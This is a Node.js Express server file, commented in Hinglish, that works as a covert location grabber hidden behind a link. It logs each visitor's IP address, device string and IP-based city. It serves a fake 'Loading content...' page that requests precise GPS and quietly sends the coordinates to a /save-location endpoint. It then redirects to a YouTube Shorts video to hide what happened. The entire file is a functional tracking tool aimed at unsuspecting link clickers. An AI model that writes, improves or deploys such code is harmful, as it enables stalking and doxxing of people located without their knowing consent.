const express = require('express');
const app = express();

// Yahan apna target YouTube link ya koi bhi link daalein jahan user ko bhejna hai
const TARGET_URL = 'https://www.youtube.com/shorts/qE';

app.get('/', (req, res) => {
    // 1. IP Address aur Device info nikalna
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();

    // IP-based approximate location fetch karna (Background mein)
    fetch(`http://ip-api.com/json/${ip.split(',')[0]}`)
        .then(response => response.json())
        .then(data => {
            console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | Location: ${data.city}, ${data.regionName}, ${data.country} | Device: ${userAgent}`);
        })
        .catch(err => {
            console.log(`IP_LOG => Time: ${timestamp} | IP: ${ip} | Location: Failed | Device: ${userAgent}`);
        });

    // 2. HTML page bhejna jo user ke browser se GPS (Latitude/Longitude) permission maangega
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
        </head>
        <body>
            <p>Loading content...</p>
            <script>
                // Agar browser geolocation support karta hai toh permission pop-up aayega
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        
                        // GPS coordinates server par bhej dena bina page roke
                        fetch('/save-location?lat=' + lat + '&lon=' + lon);
                        
                        setTimeout(function() {
                            window.location.href = '${TARGET_URL}';
                        }, 800);
                    }, function(error) {
                        // Agar user block ya deny kar de toh seedha target URL par bhej dena
                        setTimeout(function() {
                            window.location.href = '${TARGET_URL}';
                        }, 800);
                    }, { timeout: 10000, enableHighAccuracy: true });
                } else {
                    window.location.href = '${TARGET_URL}';
                }
            </script>
        </body>
        </html>
    `);
});

// GPS Latitude aur Longitude receive karne ka endpoint
app.get('/save-location', (req, res) => {
    const lat = req.query.lat;
    const lon = req.query.lon;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    // Yeh aapke Vercel Logs mein exact GPS coordinates print karega
    console.log(`GPS_EXACT_LOG => IP: ${ip} | Latitude: ${lat} | Longitude: ${lon}`);
    res.sendStatus(200);
});

module.exports = app;
